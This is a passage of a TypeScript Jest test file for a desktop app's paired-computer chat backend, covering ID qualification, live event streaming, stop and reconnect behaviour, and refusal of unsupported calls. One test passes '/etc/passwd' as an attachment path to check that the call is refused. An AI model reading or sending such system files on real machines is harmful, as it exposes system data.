/** @jest-environment jsdom */
import '../../../../cloud-chats/__tests__/jsdom-globals';
(
  globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }
).IS_REACT_ACT_ENVIRONMENT = true;
import { act, createElement } from 'react';
import { createRoot, type Root } from 'react-dom/client';
import { CanopyClientProvider } from '@canopy/app-state/CanopyClientProvider';
import { RemoteControlModelPicker } from '@canopy/ui-app';
import {
  isPairedComputerId,
  qualifyId,
} from '@canopy/protocol/authority-qualified-id';
import {
  oneWindowChannelAllowed,
  oneWindowInvocationAllowed,
} from '@canopy/protocol/remote-control/channels';
import type {
  ApprovalRequestEvent,
  CanopyApi,
  ChatCommandEnvelope,
  ChatEvent,
  ChatQueueUpdatedEvent,
  ChatStateChangedEvent,
  ChatStateSnapshot,
  ModelRegistrySnapshot,
  PairedComputerLocalProjectFacts,
  PairedComputerState,
  PairedComputerUpdate,
  PairedComputersApi,
  PersistedChatMessage,
  PreferencesLoadResult,
} from '@canopy/desktop-shared/types';
import {
  createDesktopCanopyClient,
  createDesktopCapabilities,
} from '@/client/ipc-canopy-client';
import { ChatStateRecoveryBanner } from '@/components/chat/ChatStateRecoveryBanner';
import { ChatBlockRenderer } from '@/components/chat/ChatBlockRenderer';
import { AuthRecoveryCard } from '@/components/chat/AuthRecoveryCard';
import { MessageImages } from '@/components/chat/MessageImages';
import { AiCreditsUsageLimitBanner } from '@/components/chat/AiCreditsUsageLimitBanner';
import { AiCreditsRoutingStatusBanner } from '@/components/chat/AiCreditsRoutingStatusBanner';
import * as openBillingPageModule from '@/lib/openBillingPage';
import { useAiCreditsBannerStore } from '@/stores/aiCreditsBannerStore';
import type { AuthDependencyFailure } from '@canopy/protocol/auth-recovery';
import { ChatMarkdownLink } from '@/components/chat/ChatMarkdownLink';
import { PipelineRunArtifactCard } from '@/components/chat/PipelineRunArtifactCard';
import {
  flushChatInterest,
  startChatInterestTracking,
  warmUpChat,
} from '@/lib/chat-interest';
import { ChatMarkdownFileTargetContext } from '@/components/chat/chat-markdown-file-target';
import { useImagePreviews } from '@/hooks/useSentAttachments';
import { QueuedMessageCompactRow } from '@/components/chat/QueuedMessageCompactRow';
import { ToolApprovalDock } from '@/components/chat/ToolApprovalDock';
import type { BackgroundTaskHostActions } from '@canopy/ui-app';
import type { BackgroundTask } from '@canopy/protocol/background-tasks';
import type { BackgroundProcess } from '@canopy/desktop-shared/types';
import { useBackgroundTaskActions } from '@/components/activity/useBackgroundTaskActions';
import {
  acquireSubagentTree,
  resetSubagentTreeStoreForTests,
  updateSubagentTreeRootChat,
} from '@/components/subagents/subagent-tree-store';
import { resetWorkflowRunCacheForTests } from '@/components/subagents/workflow-run-cache';
import { TurnDiffPopover } from '@/components/chat/TurnDiffPopover';
import { TurnDiffSummary } from '@/components/chat/TurnDiffSummary';
import { useFileDiffSnapshot } from '@/components/chat/useFileDiffSnapshot';
import { WorkflowBlock } from '@/components/chat/WorkflowBlock';
import {
  DelegationTranscriptSourceContext,
  resolveDelegationTranscriptSource,
  useDelegatedAgentTranscript,
} from '@/components/chat/delegated-agent-transcript';
import { QuestionPrompt } from '@canopy/ui-shared/components/chat/QuestionPrompt';
import { useQuestionPrompt } from '@canopy/ui-shared/components/chat/useQuestionPrompt';
import { useComposerQuestionPrompt } from '@/components/chat/useComposerQuestionPrompt';
import { ApprovalModePicker } from '@/components/chat/ApprovalModePicker';
import { MessageAttachments } from '@/components/chat/MessageAttachments';
import { AttachmentPreviewPopover } from '@/components/shared/AttachmentPreviewPopover';
import { useFilePreview } from '@/hooks/useFilePreview';
import {
  getStaleChatCatchUpState,
  startStaleChatCatchUp,
  type StaleChatCatchUpHost,
} from '../../stale-catch-up';
import { usePairedApprovalModeDefault } from '@/components/chat/usePairedApprovalModeDefault';
import {
  qualifyActiveSessions,
  qualifyApprovalAutoResolvedEvent,
  qualifyApprovalRequestEvent,
  qualifyChatEvent,
  qualifyChatStateChange,
  qualifyChatStateSnapshot,
  qualifyQueueUpdatedEvent,
  qualifyTabsFile,
  sanitizePairedTranscriptPage,
} from '../translate';
import { isUserCancellationTerminal } from '../../turn-events';
import { isTurnDiffEventData } from '../../turn-diffs';
import { hasPairedComputerTarget } from '../../../../../../shared/paired-computer-target';
import { useActivityStore } from '@/stores/activityStore';
import { setChatInterestRedeclareHandler } from '@/lib/chat-interest/redeclare';
import { pairedComputerScopeCapabilities } from '@/lib/paired-computer-scope-capabilities';
import { resolveTurnFileLocations } from '@/lib/turn-file-locations';
import { canTransferChatSession } from '@/lib/session-transfer-eligibility';
import { refreshOneWindowSwitch } from '@/stores/oneWindowStore';
import {
  defaultRemoteControlState,
  useRemoteControlStore,
} from '@/stores/remoteControlStore';
import { useChatStore } from '@/stores/chatStore';
import { useProjectsStore } from '@/stores/projectsStore';
import { chatBackendFor, isCapabilityUnavailable } from '../../backend';
import {
  clearPairedComputerConnectionState,
  publishPairedComputerConnectionState,
  usePairedComputerConnectionStore,
} from '../connection-store';
import {
  clearPairedComputerModelCatalog,
  pairedComputerModelLabel,
  pairedComputerModelList,
  pairedComputerPickerModels,
  projectPairedModelRegistrySnapshot,
  usePairedComputerModelCatalogStore,
} from '../model-catalog';
import { createPairedComputerChatBackendCore } from '../paired-computer-chat-backend';
import {
  closePairedComputerChats,
  declarePairedComputerChatInterest,
} from '../index';

const MAC = 'Mb8kQz3Vh2xN0pRt5LwY7a';
const LINUX = 'Lx4_Tn9-Wd2Kc7Hs1Qe6Zb';

const qMac = (id: string): string =>
  qualifyId({ kind: 'paired-computer', deviceId: MAC }, id);
const qLinux = (id: string): string =>
  qualifyId({ kind: 'paired-computer', deviceId: LINUX }, id);

const CONNECTED_FULL: PairedComputerState = {
  status: 'connected',
  version: { protocolVersion: 26, appVersion: '1.25.0' },
  capabilities: ['approvals', 'chats', 'composer', 'send', 'sidebar'],
};

interface InvokeCall {
  readonly deviceId: string;
  readonly channel: string;
  readonly args: unknown[];
}

interface FakePairedComputersApi {
  readonly api: PairedComputersApi;
  readonly held: string[];
  readonly released: string[];
  readonly invokes: InvokeCall[];
  readonly emitState: (deviceId: string, state: PairedComputerState) => void;
  readonly emitUpdate: (deviceId: string, update: PairedComputerUpdate) => void;
}

function makeFakePairedComputersApi(options?: {
  readonly initialState?: PairedComputerState;
  readonly onInvoke?: (
    deviceId: string,
    channel: string,
    args: unknown[],
  ) => unknown;
}): FakePairedComputersApi {
  const stateListeners = new Map<
    string,
    Set<(state: PairedComputerState) => void>
  >();
  const updateListeners = new Map<
    string,
    Set<(update: PairedComputerUpdate) => void>
  >();
  const stateByDevice = new Map<string, PairedComputerState>();
  const deviceByHoldId = new Map<string, string>();
  const held: string[] = [];
  const released: string[] = [];
  const invokes: InvokeCall[] = [];
  let nextHoldSeq = 0;
  const initialState = options?.initialState ?? CONNECTED_FULL;

  const api: PairedComputersApi = {
    hold: (
      deviceId: string,
    ): Promise<{ holdId: string; state: PairedComputerState }> => {
      nextHoldSeq += 1;
      const holdId = `hold-${nextHoldSeq}`;
      held.push(deviceId);
      deviceByHoldId.set(holdId, deviceId);
      const state = stateByDevice.get(deviceId) ?? initialState;
      stateByDevice.set(deviceId, state);
      return Promise.resolve({ holdId, state });
    },
    release: (holdId: string): Promise<void> => {
      const deviceId = deviceByHoldId.get(holdId);
      if (deviceId) {
        deviceByHoldId.delete(holdId);
        released.push(deviceId);
      }
      return Promise.resolve();
    },
    getState: (deviceId: string): Promise<PairedComputerState> =>
      Promise.resolve(stateByDevice.get(deviceId) ?? { status: 'idle' }),
    localProjectFacts: (): Promise<
      Record<string, PairedComputerLocalProjectFacts>
    > => Promise.resolve({}),
    invoke: (
      deviceId: string,
      channel: string,
      args: unknown[],
    ): Promise<unknown> => {
      invokes.push({ deviceId, channel, args });
      if (!oneWindowChannelAllowed(channel)) {
        return Promise.reject(
          new Error(`Channel ${channel} is outside one-window allowlist`),
        );
      }
      if (!oneWindowInvocationAllowed(channel, args)) {
        return Promise.reject(
          new Error(
            `Invocation ${channel} failed one-window allowlist: ${JSON.stringify(args)}`,
          ),
        );
      }
      const serialized = JSON.stringify(args);
      if (serialized.includes('computer-')) {
        return Promise.reject(
          new Error(
            `Outgoing ${channel} leaked paired-computer qualified id: ${serialized}`,
          ),
        );
      }
      if (options?.onInvoke) {
        return Promise.resolve(options.onInvoke(deviceId, channel, args));
      }
      return Promise.resolve(undefined);
    },
    send: (): void => undefined,
    onStateChanged: (deviceId, cb) => {
      let set = stateListeners.get(deviceId);
      if (!set) {
        set = new Set();
        stateListeners.set(deviceId, set);
      }
      set.add(cb);
      return (): void => {
        set?.delete(cb);
      };
    },
    onUpdate: (deviceId, cb) => {
      let set = updateListeners.get(deviceId);
      if (!set) {
        set = new Set();
        updateListeners.set(deviceId, set);
      }
      set.add(cb);
      return (): void => {
        set?.delete(cb);
      };
    },
  };

  return {
    api,
    held,
    released,
    invokes,
    emitState: (deviceId: string, state: PairedComputerState): void => {
      stateByDevice.set(deviceId, state);
      const listeners = stateListeners.get(deviceId);
      if (!listeners) return;
      for (const listener of listeners) listener(state);
    },
    emitUpdate: (deviceId: string, update: PairedComputerUpdate): void => {
      const listeners = updateListeners.get(deviceId);
      if (!listeners) return;
      for (const listener of listeners) listener(update);
    },
  };
}

function makeMessage(
  id: string,
  role: 'user' | 'assistant',
  text: string,
): PersistedChatMessage {
  return {
    id,
    role,
    blocks: [{ type: 'text', text }],
    timestamp: 1_700_000_000_000,
  };
}

function makeWireSnapshot(overrides?: {
  readonly revision?: number;
  readonly messages?: PersistedChatMessage[];
  readonly transcriptLoaded?: boolean;
  readonly activeTurnUserMessageId?: string;
  readonly model?: string;
}): ChatStateSnapshot {
  const activeTurn = overrides?.activeTurnUserMessageId
    ? {
        userMessageId: overrides.activeTurnUserMessageId,
        startedAt: 1_700_000_000_100,
      }
    : undefined;
  return {
    schemaVersion: 1,
    projectId: 'proj-1',
    worktreeId: 'wt-1',
    revision: overrides?.revision ?? 1,
    tabsFile: {
      version: 1,
      revision: overrides?.revision ?? 1,
      activeTabId: 'chat-1',
      tabs: [
        {
          id: 'chat-1',
          kind: 'chat',
          title: 'Remote chat',
          providerType: 'claude',
          model: overrides?.model ?? 'claude-remote-only',
          approvalMode: 'ask',
          createdAt: '2026-11-25T17:00:00.000Z',
          messages: overrides?.messages ?? [
            makeMessage('m-1', 'user', 'Hello remote'),
          ],
          ...(overrides?.transcriptLoaded === false
            ? { transcriptLoaded: false }
            : {}),
        },
      ],
    },
    archives: [],
    runtimeByChatId: {
      'chat-1': {
        status: activeTurn ? 'streaming' : 'idle',
        ...(activeTurn ? { activeTurn } : {}),
        queuedMessageIds: [],
      },
    },
    queue: [],
  };
}

const REMOTE_MODEL_SNAPSHOT: ModelRegistrySnapshot = {
  claude: [
    {
      id: 'claude-remote-only',
      label: 'Claude Remote Only',
      description: 'Only installed on paired Mac',
    },
  ],
  codex: [
    {
      id: 'codex-remote-1',
      label: 'Codex Remote',
      description: 'Paired Mac Codex',
    },
  ],
  ollama: [],
  aliases: { 'remote-alias': 'claude-remote-only' },
};

function makeWireApproval(
  requestId: string,
  overrides?: Partial<ApprovalRequestEvent>,
): ApprovalRequestEvent {
  return {
    requestId,
    projectId: 'proj-1',
    worktreeId: 'wt-1',
    chatId: 'chat-1',
    provider: 'claude',
    title: 'Run shell command',
    description: 'ls -la',
    details: { kind: 'command', command: 'ls -la' },
    ...overrides,
  };
}

let oneWindowSwitchValue = false;
let currentPairedComputersApi: PairedComputersApi | undefined;
const localChatSetStateScopesCalls: unknown[] = [];
const localChatGetStateCalls: unknown[] = [];
const localMcpQuestionCalls: string[] = [];
const localClaudeTerminalCalls: unknown[] = [];
const localReadFilePreviewCalls: unknown[] = [];

async function setOneWindowSwitchForTest(
  enabled: boolean,
  pairedApi?: PairedComputersApi,
): Promise<void> {
  oneWindowSwitchValue = enabled;
  currentPairedComputersApi = pairedApi;
  const noopUnsub = (): void => undefined;
  const loadPreferences = (): Promise<PreferencesLoadResult> =>
    Promise.resolve({
      __oneWindowEnabled: oneWindowSwitchValue,
    } as PreferencesLoadResult);
  const api = {
    loadPreferences,
    onPreferencesSynced: () => noopUnsub,
    onPreferencesChanged: () => noopUnsub,
    pairedComputers: currentPairedComputersApi,
    readFilePreview: (req: unknown): Promise<never> => {
      localReadFilePreviewCalls.push(req);
      return Promise.reject(
        new Error(
          `Local readFilePreview must not be called for paired scope: ${JSON.stringify(req)}`,
        ),
      );
    },
    claudeTerminal: {
      getState: (
        projectId: string,
        worktreeId: string,
        chatId: string,
      ): Promise<never> => {
        localClaudeTerminalCalls.push({ projectId, worktreeId, chatId });
        return Promise.reject(
          new Error(
            `Local claudeTerminal.getState must not be called for paired scope: ${projectId}`,
          ),
        );
      },
    },
    chat: {
      setStateScopes: (decl: unknown): Promise<void> => {
        localChatSetStateScopesCalls.push(decl);
        return Promise.resolve();
      },
      getState: (req: unknown): Promise<never> => {
        localChatGetStateCalls.push(req);
        return Promise.reject(
          new Error(
            `Local chat.getState must not be called for paired scope: ${JSON.stringify(req)}`,
          ),
        );
      },
      setInterest: (decl: unknown): Promise<void> => {
        const serialized = JSON.stringify(decl);
        if (serialized.includes('computer-')) {
          return Promise.reject(
            new Error(`Local chat.setInterest leaked paired id: ${serialized}`),
          );
        }
        return Promise.resolve();
      },
      answerMcpQuestion: (req: unknown): Promise<never> => {
        localMcpQuestionCalls.push(`answer:${JSON.stringify(req)}`);
        return Promise.reject(
          new Error(
            `Local chat.answerMcpQuestion must not be called for paired scope: ${JSON.stringify(req)}`,
          ),
        );
      },
      dismissMcpQuestion: (req: unknown): Promise<never> => {
        localMcpQuestionCalls.push(`dismiss:${JSON.stringify(req)}`);
        return Promise.reject(
          new Error(
            `Local chat.dismissMcpQuestion must not be called for paired scope: ${JSON.stringify(req)}`,
          ),
        );
      },
    },
  } as unknown as CanopyApi;
  Object.defineProperty(window, 'api', {
    value: api,
    configurable: true,
    writable: true,
  });
  await refreshOneWindowSwitch();
}

describe('Paired-computer chat backend & UI gating (CAN-7767)', () => {
  afterEach(async () => {
    useChatStore
      .getState()
      .releaseChatScopeRevisioned(qMac('proj-1'), qMac('wt-1'));
    closePairedComputerChats();
    clearPairedComputerConnectionState();
    clearPairedComputerModelCatalog();
    localChatSetStateScopesCalls.length = 0;
    localChatGetStateCalls.length = 0;
    localMcpQuestionCalls.length = 0;
    localClaudeTerminalCalls.length = 0;
    localReadFilePreviewCalls.length = 0;
    await setOneWindowSwitchForTest(false, undefined);
    useRemoteControlStore.setState({
      hydrated: false,
      state: defaultRemoteControlState(),
    });
    useChatStore.setState({
      pendingApprovals: {},
      pendingQuestions: {},
      worktreeChats: {},
    });
  });

  it('loads transcripts, streams live events, sends text-only commands, and issues exact Stop with zero foreign IDs on the wire', async () => {
    const snapshotsByRevision = new Map<number, ChatStateSnapshot>([
      [1, makeWireSnapshot({ revision: 1 })],
    ]);
    const approvalsOnHost: ApprovalRequestEvent[] = [makeWireApproval('req-1')];
    let lastCommandEnvelope: unknown;
    let lastCancelPayload: unknown;

    const fake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel, args) => {
        switch (channel) {
          case 'chat:get-state':
            return snapshotsByRevision.get(1);
          case 'model-registry:get':
            expect(args).toEqual([]);
            return REMOTE_MODEL_SNAPSHOT;
          case 'approval:resolved-default':
            return 'auto';
          case 'approval:pending-requests':
            return approvalsOnHost;
          case 'chat:command':
            lastCommandEnvelope = args[0];
            return {
              commandId: (args[0] as ChatCommandEnvelope).commandId,
              revision: 2,
              outcome: 'applied',
            };
          case 'chat:cancel':
            lastCancelPayload = args[0];
            return { outcome: 'stop_requested' };
          case 'chat:set-state-scopes':
          case 'chat:set-interest':
            return undefined;
          default:
            throw new Error(`Unexpected channel: ${channel}`);
        }
      },
    });

    const syncedApprovals: ApprovalRequestEvent[][] = [];
    const core = createPairedComputerChatBackendCore({
      getApi: () => fake.api,
      onConnectionState: publishPairedComputerConnectionState,
      onConnectionCleared: clearPairedComputerConnectionState,
      onModelCatalog: (deviceId, snapshot) => {
        const models = projectPairedModelRegistrySnapshot(snapshot);
        usePairedComputerModelCatalogStore.setState((current) => ({
          byDevice: { ...current.byDevice, [deviceId]: models },
          aliasesByDevice: {
            ...current.aliasesByDevice,
            [deviceId]: snapshot.aliases,
          },
        }));
      },
      onPendingApprovalsSnapshot: (_deviceId, approvals) => {
        syncedApprovals.push([...approvals]);
      },
    });

    const stateEvents: ChatStateChangedEvent[] = [];
    const chatEvents: ChatEvent[] = [];
    const queueEvents: ChatQueueUpdatedEvent[] = [];
    const approvalEvents: ApprovalRequestEvent[] = [];
    core.backend.chat.onStateChanged((event) => stateEvents.push(event));
    core.backend.chat.onChatEvent((event) => chatEvents.push(event));
    core.backend.chat.onChatQueueUpdated((event) => queueEvents.push(event));
    core.backend.approvals.onRequest((event) => approvalEvents.push(event));

    // Declare scope before reading snapshot (matches RevisionedChatSync order).
    await core.backend.chat.setStateScopes({
      kind: 'scopes',
      scopes: [{ projectId: qMac('proj-1'), worktreeId: qMac('wt-1') }],
    });

    const snapshot = await core.backend.chat.getState({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
    });

    // Every ID in the returned snapshot is qualified for MAC.
    expect(snapshot.projectId).toBe(qMac('proj-1'));
    expect(snapshot.worktreeId).toBe(qMac('wt-1'));
    expect(snapshot.tabsFile.activeTabId).toBe(qMac('chat-1'));
    expect(snapshot.tabsFile.tabs[0]?.id).toBe(qMac('chat-1'));
    expect(snapshot.runtimeByChatId[qMac('chat-1')]?.status).toBe('idle');

    // Wait for background model catalog + pending approvals sync.
    await Promise.resolve();
    await Promise.resolve();
    expect(
      pairedComputerModelLabel(
        usePairedComputerModelCatalogStore.getState(),
        qMac('proj-1'),
        'claude-remote-only',
      ),
    ).toBe('Claude Remote Only');
    expect(
      pairedComputerModelLabel(
        usePairedComputerModelCatalogStore.getState(),
        qMac('proj-1'),
        'remote-alias',
      ),
    ).toBe('Claude Remote Only');
    expect(syncedApprovals.at(-1)?.[0]?.requestId).toBe(qMac('req-1'));

    // Read-only resolved default mode crosses approval:resolved-default with stripped IDs.
    const defaultMode = await core.backend.approvals.getResolvedDefault({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
    });
    expect(defaultMode).toBe('auto');

    // Exact Stop when idle does not invoke chat:cancel.
    const idleCancel = await core.backend.chat.cancel({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
      chatId: qMac('chat-1'),
    });
    expect(idleCancel).toEqual({ outcome: 'turn_not_active' });
    expect(lastCancelPayload).toBeUndefined();

    // Send text-only message via chat.send_message.
    const sendResult = await core.backend.chat.sendMessage({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
      chatId: qMac('chat-1'),
      text: 'Run the test suite',
      userMessageId: 'user-msg-1',
    });
    expect(sendResult).toEqual({});
    expect(lastCommandEnvelope).toMatchObject({
      schemaVersion: 1,
      projectId: 'proj-1',
      worktreeId: 'wt-1',
      command: {
        type: 'chat.send_message',
        chatId: 'chat-1',
        userMessageId: 'user-msg-1',
        text: 'Run the test suite',
      },
    });
    expect(
      Object.keys(lastCommandEnvelope as Record<string, unknown>).sort(),
    ).toEqual([
      'command',
      'commandId',
      'projectId',
      'schemaVersion',
      'worktreeId',
    ]);

    // Live runtime + streaming delta arrives from paired computer.
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:state-changed',
      args: [
        {
          schemaVersion: 1,
          eventId: 'ev-2',
          occurredAt: '2026-11-25T18:00:00Z',
          projectId: 'proj-1',
          worktreeId: 'wt-1',
          baseRevision: 1,
          revision: 2,
          changes: [
            {
              type: 'runtime.patched',
              chatId: 'chat-1',
              runtime: {
                status: 'streaming',
                activeTurn: {
                  userMessageId: 'user-msg-1',
                  startedAt: 1_700_000_000_500,
                },
                queuedMessageIds: [],
              },
            },
            {
              type: 'message.upserted',
              chatId: 'chat-1',
              message: makeMessage('a-1', 'assistant', 'Running tests...'),
            },
          ],
        },
      ],
    });
    expect(stateEvents).toHaveLength(1);
    expect(stateEvents[0]?.projectId).toBe(qMac('proj-1'));
    expect(stateEvents[0]?.eventId).toBe(`computer-${MAC}:ev-2`);

    // Sending a second message while running queues on the paired computer
    // without clobbering the active turn's userMessageId for exact Stop.
    await core.backend.chat.sendMessage({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
      chatId: qMac('chat-1'),
      text: 'Follow up after tests',
      userMessageId: 'user-msg-2',
    });
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:queue-updated',
      args: [
        {
          projectId: 'proj-1',
          worktreeId: 'wt-1',
          chatId: 'chat-1',
          queue: [
            {
              id: 'q-1',
              text: 'Follow up after tests',
              origin: 'desktop',
              enqueuedAtMs: 1_700_000_000_600,
            },
          ],
        },
      ],
    });
    expect(queueEvents[0]?.chatId).toBe(qMac('chat-1'));

    // Exact Stop targets the running turn ('user-msg-1'), NOT the queued follow-up ('user-msg-2').
    const cancelResult = await core.backend.chat.cancel({
      projectId: qMac('proj-1'),
      worktreeId: qMac('wt-1'),
      chatId: qMac('chat-1'),
    });
    expect(cancelResult).toEqual({ outcome: 'stop_requested' });
    expect(lastCancelPayload).toEqual({
      projectId: 'proj-1',
      worktreeId: 'wt-1',
      chatId: 'chat-1',
      expectedUserMessageId: 'user-msg-1',
    });

    // Live chat:event and approval:request qualify IDs and ignore undeclared scopes.
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'chat:event',
      args: [
        {
          projectId: 'proj-1',
          worktreeId: 'wt-1',
          chatId: 'chat-1',
          type: 'text_delta',
          data: { delta: 'hi' },
        },
      ],
    });
    expect(chatEvents[0]?.chatId).toBe(qMac('chat-1'));

    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'approval:request',
      args: [makeWireApproval('req-undeclared', { worktreeId: 'wt-other' })],
    });
    fake.emitUpdate(MAC, {
      type: 'push',
      channel: 'approval:request',
      args: [makeWireApproval('req-live')],
    });
    expect(approvalEvents).toHaveLength(1);
    expect(approvalEvents[0]?.requestId).toBe(qMac('req-live'));

    // Releasing all scopes releases the device hold cleanly.
    await core.backend.chat.setStateScopes({ kind: 'scopes', scopes: [] });
    expect(fake.released).toEqual([MAC]);
  });

  it('shows reconnecting state on drop and recovers scopes, interest, approvals, and missed messages without loss or duplication', async () => {
    let pendingApprovalsOnHost: ApprovalRequestEvent[] = [
      makeWireApproval('req-before-drop'),
    ];
    let currentWireSnapshot = makeWireSnapshot({
      revision: 1,
      messages: [makeMessage('m-1', 'user', 'First')],
    });
    const fake = makeFakePairedComputersApi({
      onInvoke: (_deviceId, channel) => {
        if (channel === 'chat:get-state') {
          return currentWireSnapshot;
        }
        if (channel === 'approval:pending-requests') {
          return pendingApprovalsOnHost;
        }
        if (channel === 'model-registry:get') return REMOTE_MODEL_SNAPSHOT;
        return undefined;
      },
    });

    await setOneWindowSwitchForTest(true, fake.api);

    const hydrated = await useChatStore
      .getState()
      .hydrateChatScopeRevisioned(qMac('proj-1'), qMac('wt-1'));
    expect(hydrated).toBe('installed');
    expect(localChatGetStateCalls).toEqual([]);
    expect(JSON.stringify(localChatSetStateScopesCalls)).not.toContain(
      'computer-',
    );

    const scopeKey = `${qMac('proj-1')}/${qMac('wt-1')}`;
    expect(
      useChatStore
        .getState()
        .worktreeChats[scopeKey]?.tabs[0]?.messages.map((m) => m.id),
    ).toEqual(['m-1']);

    const initialScopeInvokes = fake.invokes.filter(
      (call) => call.channel === 'chat:set-state-scopes',
    ).length;

    // Drop connection -> banner shows reconnecting state while transcript stays visible.
    fake.emitState(MAC, { status: 'connecting' });
    expect(
      usePairedComputerConnectionStore.getState().byDevice[MAC]?.everConnected,
    ).toBe(true);

    const container = document.createElement('div');
    document.body.appendChild(container);
    const root: Root = createRoot(container);
    act(() => {
      root.render(
        createElement(ChatStateRecoveryBanner, {
          projectId: qMac('proj-1'),
          worktreeId: qMac('wt-1'),
        }),
      );
    });
    expect(
      container.querySelector(
        '[data-testid="paired-computer-connection-banner"]',
      )?.textContent,
    ).toContain('Reconnecting');

    // While disconnected, a message arrived on the host, req-before-drop settled, and req-after-reconnect arrived.
    currentWireSnapshot = makeWireSnapshot({
      revision: 3,
      messages: [
        makeMessage('m-1', 'user', 'First'),
        makeMessage('m-2', 'assistant', 'Missed while offline'),
      ],
    });
    pendingApprovalsOnHost = [makeWireApproval('req-after-reconnect')];

    // Reconnect: re-declares scopes, refreshes store snapshot, reconciles approvals, clears banner.
    await act(async () => {
      fake.emitState(MAC, CONNECTED_FULL);
      fake.emitUpdate(MAC, { type: 'reconnected' });
      await new Promise((resolve) => setTimeout(resolve, 20));
    });

    expect(
      fake.invokes.filter((call) => call.channel === 'chat:set-state-scopes')
        .length,
    ).toBeGreaterThan(initialScopeInvokes);
    // Transcript recovered missed message with zero duplication and stale cleared.
    const recoveredTab =
      useChatStore.getState().worktreeChats[scopeKey]?.tabs[0];
    expect(recoveredTab?.messages.map((m) => m.id)).toEqual(['m-1', 'm-2']);
    expect(recoveredTab?.transcriptStale).toBeFalsy();
    // Stale approval removed and current approval present.
    expect(Object.keys(useChatStore.getState().pendingApprovals)).toEqual([
      qMac('req-after-reconnect'),
    ]);

    act(() => {
      root.render(
        createElement(ChatStateRecoveryBanner, {
          projectId: qMac('proj-1'),
          worktreeId: qMac('wt-1'),
        }),
      );
    });
    expect(
      container.querySelector(
        '[data-testid="paired-computer-connection-banner"]',
      ),
    ).toBeNull();

    // Body-less snapshot after reconnect preserves transcriptStale so paged catch-up knows to reload.
    currentWireSnapshot = makeWireSnapshot({
      revision: 4,
      messages: [],
      transcriptLoaded: false,
    });
    await act(async () => {
      fake.emitState(MAC, { status: 'connecting' });
      fake.emitState(MAC, CONNECTED_FULL);
      fake.emitUpdate(MAC, { type: 'reconnected' });
      await new Promise((resolve) => setTimeout(resolve, 20));
    });
    const bodylessTab =
      useChatStore.getState().worktreeChats[scopeKey]?.tabs[0];
    expect(bodylessTab?.transcriptStale).toBe(true);
    expect(bodylessTab?.messages.map((m) => m.id)).toEqual(['m-1', 'm-2']);

    act(() => {
      root.unmount();
    });
    container.remove();
  });

  it('refuses every unsupported member with capability_unavailable and gates behind one-window switch', async () => {
    const fake = makeFakePairedComputersApi();
    const core = createPairedComputerChatBackendCore({
      getApi: () => fake.api,
    });
    const scope = { projectId: qMac('proj-1'), worktreeId: qMac('wt-1') };
    const target = { ...scope, chatId: qMac('chat-1') };

    const unsupportedCalls: Array<() => Promise<unknown>> = [
      () => core.backend.chat.archiveTab({ ...scope, tabId: qMac('chat-1') }),
      () =>
        core.backend.chat.changeModel({ ...target, model: 'claude-sonnet' }),
      () =>
        core.backend.chat.cancelQueuedMessage({
          ...target,
          entryId: 'q-1',
        }),
      () =>
        core.backend.chat.editQueuedMessage({
          ...target,
          entryId: 'q-1',
          text: 'edited',
        }),
      () =>
        core.backend.chat.forceQueuedMessage({
          ...target,
          entryId: 'q-1',
        }),
      () => core.backend.chat.togglePlanMode({ ...target, enabled: true }),
      () =>
        core.backend.chat.toggleThinkingLevel({
          ...target,
          level: 'high',
        }),
      () => core.backend.chat.toggleCodexFastMode({ ...target, enabled: true }),
      () =>
        core.backend.chat.updatePlugins({
          ...target,
          pluginSelections: {
            collectionIds: [],
            skillRefs: [],
            pluginRefs: [],
            mcpServerRefs: [],
          },
        }),
      () =>
        core.backend.chat.sendMessage({
          ...target,
          text: 'with attachment',
          userMessageId: 'user-attach-1',
          attachmentPaths: ['/etc/passwd'],
        }),
      () =>
        core.backend.chat.command({
          schemaVersion: 1,
          commandId: 'cmd-create',
          ...scope,
          command: { type: 'chat.create_tab', tabId: qMac('chat-2') },
        }),
      () =>
        core.backend.chat.command({
          schemaVersion: 1,
          commandId: 'cmd-mark-read',
          ...scope,
          command: { type: 'chat.mark_read', chatId: qMac('chat-1') },
        }),
      () =>
        core.backend.chat.command({
          schemaVersion: 1,
          commandId: 'cmd-settings',
          ...scope,
          command: {
            type: 'chat.patch_tab_settings',
            tabId: qMac('chat-1'),
            patch: { pinned: true },
          },
        }),
      () =>
        core.backend.approvals.respond({
          ...target,
          requestId: qMac('req-1'),
          decision: { behavior: 'allow', scope: 'once' },
        }),
      () =>
        core.backend.approvals.respondSecretInput({
          ...target,
          requestId: qMac('req-1'),
          bindingId: 'b-1',
          secret: 's',
        }),
      () =>
        core.backend.approvals.dismiss({
          ...target,
          requestId: qMac('req-1'),
        }),
      () =>
        core.backend.approvals.setMode({
          ...target,
          mode: 'full-access',
        }),
      () =>
        core.backend.secretRequests.submit({
          chatId: qMac('chat-1'),
          requestId: qMac('req-1'),
          values: { TOKEN: 'x' },
          useHeld: [],
        }),
      () =>
        core.backend.secretRequests.decline({
          chatId: qMac('chat-1'),
          requestId: qMac('req-1'),
        }),
    ];

    for (const invoke of unsupportedCalls) {
      let caught: unknown;
      try {
        await invoke();
      } catch (err) {
        caught = err;
      }
      expect(isCapabilityUnavailable(caught)).toBe(true);
    }

    // Window-local tab activation succeeds without crossing the tunnel.
    const activateResult = await core.backend.chat.command({
      schemaVersion: 1,
      commandId: 'cmd-activate',
      ...scope,
      command: { type: 'chat.activate_tab', tabId: qMac('chat-1') },
    });
    expect(activateResult.outcome).toBe('applied');
    expect(fake.invokes).toEqual([]);

    // With one-window switch OFF, chatBackendFor refuses paired-computer calls
    // without touching window.api.chat or window.api.pairedComputers.
    await setOneWindowSwitchForTest(false, fake.api);
    let offError: unknown;
    try {
      await chatBackendFor({ projectId: qMac('proj-1') }).chat.getState(scope);
    } catch (err) {
      offError = err;
    }
    expect(isCapabilityUnavailable(offError)).toBe(true);

    // Local chats remain routed to the local backend untouched.
    expect(isPairedComputerId('local-proj')).toBe(false);
